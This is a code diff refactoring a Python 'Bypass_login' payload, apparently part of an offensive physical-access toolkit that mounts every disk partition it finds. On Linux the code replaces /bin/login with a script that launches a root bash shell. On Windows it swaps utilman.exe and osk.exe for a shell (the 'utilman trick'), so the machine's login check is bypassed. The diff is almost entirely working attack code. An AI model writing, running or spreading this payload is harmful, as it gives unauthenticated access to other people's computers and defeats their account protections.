@@ -9,18 +9,13 @@ PASSPHRASES = "@PASSPHRASES@"
 
 
 @entry_point.entry_point
-def main() -> None:
-    block_info, _, our_device = storage.setup()
-    common_utils.print_info("Bypass_login payload started")
+def main(block_info: storage.BlocksType, *_) -> None:
     for part in storage.query_all_partitions(block_info):
-        if storage.get_partition_root(part, block_info) == our_device:
-            continue
         with storage.mount_partition(part, PASSPHRASES) as mounted_part:
             part_info = storage.query_partition_info_by_path(part, block_info)
             assert part_info is not None
             # Try to see if we are dealing with any sort of Linux
-            if (mounted_part.exists("usr/sbin/init") or mounted_part.exists("usr/bin/init")) \
-                    and mounted_part.exists("etc/shadow"):
+            if mounted_part.is_linux():
                 # On Linux, replace login with a script that calls bash
                 if mounted_part.exists("bin/login.bak"):
                     mounted_part.remove("bin/login.bak")
@@ -33,7 +28,7 @@ def main() -> None:
                     stream.write("exec /bin/bash -il\n")
                 programs.Chmod().invoke_and_wait(None, "+x", mounted_part.join("bin/login"))
 
-            elif mounted_part.exists("Windows"):
+            elif mounted_part.is_windows():
                 # Use the utilman trick
                 for program in ("utilman.exe", "osk.exe"):
                     if mounted_part.exists(f"Windows/System32/{program}.bak"):
@@ -46,6 +41,5 @@ def main() -> None:
             else:
                 common_utils.print_warning("Unknown operating system!")
 
-    common_utils.print_ok("Bypass_login payload completed")
 if __name__ == "__main__":
     main()
